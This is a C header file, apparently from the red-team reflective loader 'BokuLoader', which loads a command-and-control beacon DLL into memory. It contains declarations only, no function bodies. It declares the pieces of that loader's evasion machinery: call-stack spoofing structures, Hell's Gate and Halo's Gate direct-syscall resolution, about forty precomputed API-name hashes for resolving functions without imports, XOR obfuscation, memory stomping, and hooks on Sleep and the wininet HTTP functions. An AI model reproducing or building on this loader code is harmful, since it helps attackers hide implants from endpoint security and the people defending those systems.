#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#define STATUS_SUCCESS 0x0
#define MAX_STACK_SIZE 12000
#define RBP_OP_INFO 0x5
#define true 1


typedef struct Spoof_Struct
{
    PVOID Fixup;                     // +0x00
    PVOID original_return_address;   // +0x08
    PVOID rbx;                       // +0x10
    PVOID rdi;                       // +0x18
    PVOID frame_1_stack_frame_size;  // +0x20 BaseThreadInitThunk stack frame size
    PVOID frame_1_return_address;    // +0x28 BaseThreadInitThunk + 0x14
    PVOID gadget_stack_frame_size;   // +0x30
    PVOID frame_0_stack_frame_size;  // +0x38 RtlUserThreadStart  stack frame size
    PVOID frame_0_return_address;    // +0x40 RtlUserThreadStart + 0x21
    PVOID ssn;                       // +0x48  
    PVOID gadget_return_address;     // +0x50
    PVOID rsi;                       // +0x58
    PVOID r12;                       // +0x60
    PVOID r13;                       // +0x68
    PVOID r14;                       // +0x70
    PVOID r15;                       // +0x78
    PVOID frame_2_stack_frame_size;  // +0x80 ThreadStartAddress  stack frame size
    PVOID frame_2_return_address;    // +0x88 ThreadStartAddress 
} Spoof_Struct, * pSpoof_Struct;

typedef struct Export {
    PVOID   Directory;
    DWORD DirectorySize;
    PVOID   AddressTable;
    PVOID   NameTable;
    PVOID   OrdinalTable;
    DWORD NumberOfNames;
}Export;

typedef struct Dll {
    PVOID dllBase;
    DWORD size;
    DWORD SizeOfHeaders;
    PVOID OptionalHeader;
    PVOID SizeOfOptionalHeader;
    PVOID NthSection;
    DWORD NumberOfSections;
    DWORD BeaconMemoryProtection;
    PVOID EntryPoint;
    PVOID text_section;
    DWORD text_section_size;
    PVOID pdata_section;
    DWORD pdata_section_size;
    Export Export;
    ULONG_PTR obfuscate;
    BYTE xor_key;
    BYTE* Name;
    IMAGE_DOS_HEADER         * dos_header;
    IMAGE_FILE_HEADER        * file_header;
    IMAGE_OPTIONAL_HEADER64  * optional_header;
    unsigned short             optional_header_size;
    IMAGE_EXPORT_DIRECTORY   * export_directory;
    IMAGE_SECTION_HEADER     * section_header;
    IMAGE_DATA_DIRECTORY     * data_directory;
    VOID                     * import_directory;
    DWORD              import_directory_size;
}Dll, *PDll;

typedef struct Section {
    PVOID RVA;
    PVOID dst_rdll_VA;
    PVOID src_rdll_VA;
    PVOID PointerToRawData;
    DWORD SizeOfSection;
    DWORD Characteristics;
}Section;

#if !defined(NTSTATUS)
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define WOW64_POINTER(Type) ULONG
typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// https://github.com/kyleavery/AceLdr/blob/main/src/native.h
typedef struct _STRING
{
	WORD Length;
	WORD MaximumLength;
	PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING, **PPUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef CONST BYTE *PCSZ;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;                 //    +0x000
    LIST_ENTRY InMemoryOrderModuleList;          //    +0x010
    LIST_ENTRY InInitializationOrderModuleList;  //    +0x020
    PVOID  DllBase;                               //    +0x030
    PVOID  EntryPoint;                            //    +0x038
    ULONG_PTR  SizeOfImage;                           //    +0x040
    UNICODE_STRING FullDllName;                  //    +0x048
    UNICODE_STRING BaseDllName;                  //    +0x058
    PVOID  Flags;                                 //    +0x068
    LIST_ENTRY HashTableEntry;                   //    +0x070
    PVOID  TimeDateStamp;                         //    +0x080
    PVOID  EntryPointActivationContext;           //    +0x088
    PVOID  Lock;                                  //    +0x090
    PVOID  DdagNode;                              //    +0x098
    LIST_ENTRY NodeModuleLink;                   //    +0x0a0
    PVOID  LoadContext;                           //    +0x0b0
    PVOID  ParentDllBase;                         //    +0x0b8
    PVOID  SwitchBackContext;                     //    +0x0c0
    LIST_ENTRY BaseAddressIndexNode1;            //    +0x0c8
    PVOID  BaseAddressIndexNode3;                 //    +0x0d8
    PVOID  MappingInfoIndexNode1;                 //    +0x0e0
    PVOID  MappingInfoIndexNode2;                 //    +0x0e8
    PVOID  MappingInfoIndexNode3;                 //    +0x0f0
    PVOID  OriginalBase;                          //    +0x0f8
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
    DWORD dwLength;
    DWORD dwInitialized;
    PVOID  lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID  lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    PVOID  lpMutant;
    PVOID  lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    PVOID  lpProcessParameters;
    PVOID  lpSubSystemData;
    PVOID  lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    PVOID  lpFastPebLockRoutine;
    PVOID  lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    PVOID  lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    PVOID  lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    PVOID  lpReadOnlySharedMemoryBase;
    PVOID  lpReadOnlySharedMemoryHeap;
    PVOID  lpReadOnlyStaticServerData;
    PVOID  lpAnsiCodePageData;
    PVOID  lpOemCodePageData;
    PVOID  lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    PVOID  lpProcessHeaps;
    PVOID  lpGdiSharedHandleTable;
    PVOID  lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    PVOID  lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    PVOID  lpPostProcessInitRoutine;
    PVOID  lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    PVOID  lppShimData;
    PVOID  lpAppCompatInfo;
    UNICODE_STRING usCSDVersion;
    PVOID  lpActivationContextData;
    PVOID  lpProcessAssemblyStorageMap;
    PVOID  lpSystemDefaultActivationContextData;
    PVOID  lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * PPEB;

extern PVOID  NTAPI spoof_synthetic_callstack(PVOID  a, ...);

#define GDI_BATCH_BUFFER_SIZE 310
typedef struct _STRING32
{
	WORD Length;
	WORD MaximumLength;
	ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;
typedef UNICODE_STRING32 *PUNICODE_STRING32;

// https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c
PVOID  WINAPI RtlSecureZeroMemory(PVOID  ptr,SIZE_T cnt);

typedef enum _PROCESSINFOCLASS {
  ProcessBasicInformation = 0,
  ProcessDebugPort = 7,
  ProcessWow64Information = 26,
  ProcessImageFileName = 27,
  ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef enum _MEMORY_INFORMATION_CLASS {
  MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;


PVOID Setup();
PVOID BokuLoader();
VOID checkObfuscate(Dll * raw_beacon_dll_struct);
VOID checkUseRWX(Dll * raw_beacon_dll_struct);
PVOID returnRDI();
PVOID xLoadLibrary(PVOID library_name);
PVOID   add(PVOID a, PVOID b);
VOID xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey);

DWORD findSyscallNumber(PVOID ntdllApiAddr);
DWORD HellsGate(DWORD wSystemCall);
VOID  HellDescent(VOID);
DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
DWORD getSyscallNumber(PVOID functionAddress);
SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
SIZE_T StringLengthA(LPCSTR String);

PVOID checkFakeEntryAddress_returnReal(Dll * raw_beacon_dll_struct, Dll * virtual_beacon_dll_struct);

typedef PVOID  (WINAPI * tLoadLibraryA)  (BYTE *);
typedef PVOID  (WINAPI * t_LoadLibraryExA)  (BYTE *lpLibFileName,HANDLE hFile,DWORD  dwFlags);
typedef PVOID  (WINAPI * tGetProcAddress)(PVOID, BYTE*);
typedef LONG32 (NTAPI  * tNtProt)        (PVOID, PVOID, PVOID, DWORD, PVOID);
typedef LONG32 (NTAPI  * tNtAlloc)       (PVOID, PVOID, DWORD *, PSIZE_T, DWORD, DWORD);
typedef LONG32 (NTAPI  * tNtFree)        (PVOID, PVOID, PSIZE_T, DWORD);
typedef LONG32(NTAPI* t_NtQueryInformationThread)( HANDLE ThreadHandle, DWORD ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);
typedef HANDLE(WINAPI* t_CreateFileMappingA)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
typedef PVOID (WINAPI* t_MapViewOfFile)( HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);

typedef NTSTATUS(NTAPI  * t_LdrGetProcedureAddress)( IN PVOID  DllHandle, IN OPTIONAL PANSI_STRING ProcedureName, IN OPTIONAL ULONG ProcedureNumber, OUT PVOID  *ProcedureAddress);
typedef NTSTATUS (NTAPI * t_RtlAnsiStringToUnicodeString)(PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString);
typedef VOID (NTAPI * t_RtlFreeUnicodeString)(PUNICODE_STRING UnicodeString);
typedef VOID (NTAPI * t_RtlInitAnsiString)(PANSI_STRING DestinationString, PCSZ SourceString);
typedef NTSTATUS (NTAPI * t_LdrLoadDll)(OPTIONAL PWSTR DllPath, OPTIONAL PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID  *DllHandle);
typedef long(NTAPI* tNtQueryVirtualMemory)( HANDLE ProcessHandle, PVOID  BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID  MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef NTSTATUS  (NTAPI * t_NtUnmapViewOfSection)( IN HANDLE ProcessHandle, IN PVOID  BaseAddress);
typedef PVOID    (NTAPI * tNtDelayExecution)( BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

typedef struct StackFrame
{
    LPCWSTR dllPath;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID  returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;
} StackFrame, * PStackFrame;
typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    WORD FrameOffset;
} UNWIND_CODE, * PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, * PUNWIND_INFO;

typedef PRUNTIME_FUNCTION (NTAPI * tRtlLookupFunctionEntry)(
  DWORD64 ControlPc,
  PDWORD64 ImageBase,
  PUNWIND_HISTORY_TABLE HistoryTable
);

typedef PVOID  (WINAPI * tGetProcessHeap)();
typedef PVOID  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);

typedef struct APIS{
    tLoadLibraryA LoadLibraryA;
    t_LoadLibraryExA LoadLibraryEx;
    tHeapAlloc HeapAlloc;
    tGetProcessHeap GetProcessHeap;
    t_CreateFileMappingA CreateFileMappingA;
    t_MapViewOfFile MapViewOfFile;
    t_LdrGetProcedureAddress LdrGetProcedureAddress;
    t_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString;
    t_RtlFreeUnicodeString  RtlFreeUnicodeString;
    t_RtlInitAnsiString RtlInitAnsiString;
    t_LdrLoadDll LdrLoadDll;
    t_NtUnmapViewOfSection NtUnmapViewOfSection;
    tNtQueryVirtualMemory NtQueryVirtualMemory;
    PVOID pNtAllocateVirtualMemory;
    PVOID pNtProtectVirtualMemory;
    PVOID pNtFreeVirtualMemory;
    tRtlLookupFunctionEntry RtlLookupFunctionEntry; 
}APIS;

VOID getApis(APIS * api);
VOID doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
VOID doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
VOID doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
VOID stomp(ULONG_PTR length, BYTE * buff);
PVOID get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, PVOID raw_hook_address);
VOID Sleep_Hook(DWORD dwMilliseconds);
PVOID check_and_write_IAT_Hook(DWORD api_hash, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
typedef PVOID  (WINAPI * DLLMAIN)(HINSTANCE, DWORD, PVOID);
BOOL StringCompareA( LPCSTR String1, LPCSTR String2 );
BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size);
PVOID FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gadget, DWORD gadget_size);
ULONG CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api);

#define HINTERNET PVOID
LPVOID InternetOpenA_Hook(BYTE* lpszAgent, DWORD dwAccessType, BYTE* lpszProxy, BYTE* lpszProxyBypass, DWORD  dwFlags);
LPVOID InternetConnectA_Hook(PVOID hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
LPVOID HttpOpenRequestA_Hook(PVOID hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
BOOL HttpSendRequestA_Hook(PVOID hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL InternetReadFile_Hook(PVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
BOOL InternetQueryDataAvailable_Hook(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
BOOL InternetCloseHandle_Hook(HINTERNET hInternet);
BOOL InternetQueryOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
BOOL InternetSetOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
BOOL InternetSetStatusCallback_Hook(HINTERNET hInternet, PVOID lpfnInternetCallback);
BOOL HttpAddRequestHeadersA_Hook(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
BOOL HttpQueryInfoA_Hook(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

typedef LPVOID(* t_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef LPVOID(* t_InternetConnectA)(HANDLE, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef LPVOID(* t_HttpOpenRequestA)(LPVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL(* t_HttpSendRequestA)(LPVOID, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(* t_InternetReadFile)(LPVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL(* t_InternetQueryDataAvailable)(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(* t_InternetCloseHandle)(LPVOID);
typedef BOOL(* t_InternetQueryOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
typedef BOOL(* t_InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL(* t_InternetSetStatusCallback)(HINTERNET hInternet, PVOID lpfnInternetCallback);
typedef BOOL(* t_HttpAddRequestHeadersA)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
typedef BOOL(* t_HttpQueryInfoA)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);


typedef struct wininet_apis
{
    t_InternetOpenA               InternetOpenA;
    t_InternetConnectA            InternetConnectA;
    t_HttpOpenRequestA            HttpOpenRequestA;
    t_HttpSendRequestA            HttpSendRequestA;
    t_InternetReadFile            InternetReadFile;
    t_InternetQueryDataAvailable  InternetQueryDataAvailable;
    t_InternetCloseHandle         InternetCloseHandle;
    t_InternetQueryOptionA        InternetQueryOptionA;
    t_InternetSetOptionA          InternetSetOptionA;
    t_InternetSetStatusCallback   InternetSetStatusCallback;
    t_HttpAddRequestHeadersA      HttpAddRequestHeadersA;
    t_HttpQueryInfoA              HttpQueryInfoA;
}wininet_apis;

VOID resolve_wininet_apis(wininet_apis * wininet);
VOID setup_synthetic_callstack(Spoof_Struct * spoof_struct);

typedef PVOID  (WINAPI * tGetProcessHeap)();
typedef PVOID  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef PVOID  (WINAPI * tHeapFree) (HANDLE, DWORD, PVOID);

typedef struct HEAP_APIS{
    tGetProcessHeap GetProcessHeap;
    tHeapAlloc      HeapAlloc;
    tHeapFree       HeapFree;
}HEAP_APIS;

typedef struct nt_apis{
    tNtQueryVirtualMemory NtQueryVirtualMemory;
}nt_apis;

VOID getHeapApis(HEAP_APIS * api);

#define NtCurrentProcess() ( (PVOID)(LONG_PTR) -1 )

#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
#endif

PVOID xGetProcAddress_hashed(DWORD hash, Dll * module);
PVOID resolve_api_address_from_hash(DWORD api_hash, Dll * module);
DWORD hash(BYTE* string);

PVOID xGetProcAddress_hash(DWORD api_hash, Dll * module); 

#define NTQUERYVIRTUALMEMORY         0x5d4bc34a  // ntqueryvirtualmemory
#define LDRGETPROCEDUREADDRESS       0x67c04785  // ldrgetprocedureaddress
#define RTLINITANSISTRING            0xe60378c2  // rtlinitansistring
#define NTALLOCATEVIRTUALMEMORY      0x103d64df  // ntallocatevirtualmemory
#define NTPROTECTVIRTUALMEMORY       0xbc028cc7  // ntprotectvirtualmemory
#define NTFREEVIRTUALMEMORY          0x7ccb7f20  // ntfreevirtualmemory
#define LDRLOADDLL                   0x8a1a1fc2  // ldrloaddll
#define RTLANSISTRINGTOUNICODESTRING 0x11027ab9  // rtlansistringtounicodestringring
#define LDRGETPROCEDUREADDRESS       0x67c04785  // ldrgetprocedureaddress
#define RTLFREEUNICODESTRING         0x4ec50e0e  // rtlfreeunicodestring
#define RTLINITANSISTRING            0xe60378c2  // rtlinitansistring
#define NTUNMAPVIEWOFSECTION         0xc4a552c4  // ntunmapviewofsection
#define NTQUERYVIRTUALMEMORY         0x5d4bc34a  // ntqueryvirtualmemory
#define LOADLIBRARYEXA               0xad631535  // loadlibraryexa
#define CREATEFILEMAPPINGA           0x6bdc31f3  // createfilemappinga
#define MAPVIEWOFFILE                0xa1c75a38  // mapviewoffile
#define GETPROCESSHEAP               0x210dd79f  // getprocessheap
#define HEAPFREE                     0xbc0be1c0  // heapfree
#define RTLALLOCATEHEAP              0x2cf6348b  // rtlallocateheap
#define HEAPALLOC                    0xe9cc7d0b  // heapalloc
#define RTLUSERTHREADSTART           0x9d1bbd03  // rtluserthreadstart
#define BASETHREADINITTHUNK          0x08620361  // basethreadinitthunk
#define RTLLOOKUPFUNCTIONENTRY       0xf0b21bc0  // rtllookupfunctionentry
#define NTDELAYEXECUTION             0x2bd49771  // ntdelayexecution
#define INTERNETOPENA                0x9655ac2c  // internetopena
#define INTERNETCONNECTA             0x4215bb14  // internetconnecta
#define HTTPOPENREQUESTA             0xf966ee7c  // httpopenrequesta
#define HTTPSENDREQUESTA             0xe8bda4aa  // httpsendrequesta
#define INTERNETREADFILE             0xf7db660f  // internetreadfile
#define INTERNETQUERYDATAAVAILABLE   0xb0dd8fe6  // internetquerydataavailablele
#define INTERNETCLOSEHANDLE          0x9d2b4e39  // internetclosehandle
#define INTERNETQUERYOPTIONA         0x967fe661  // internetqueryoptiona
#define INTERNETSETOPTIONA           0x04e8f661  // internetsetoptiona
#define INTERNETSETSTATUSCALLBACK    0x968fb04a  // internetsetstatuscallbackk
#define HTTPADDREQUESTHEADERSA       0x45811601  // httpaddrequestheadersa
#define HTTPQUERYINFOA               0x0512ca9f  // httpqueryinfoa
#define NTQUERYINFORMATIONTHREAD     0x11eb72c4  // ntqueryinformationthread
#define NTDLL                        0xfb4e1a2c  // ntdll.dll
#define KERNEL32                     0x0ad9a9a6  // kernel32.dll
#define WININET                      0x35847a6e  // wininet.dll
#define SLEEP                        0xb60c818f  // sleep

VOID parse_module_headers(Dll* module);
VOID get_sections(Dll* module);
DWORD hash_memory(BYTE * memory, DWORD size);
DWORD wide_string_length(wchar_t * wide_string);
VOID utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_string);
DWORD hash_ascii_string(BYTE* string);
BYTE * loaded_module_base_from_hash(DWORD hash);
RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_address);
VOID memory_copy(PVOID destination_ptr, PVOID source_ptr, DWORD number_of_bytes);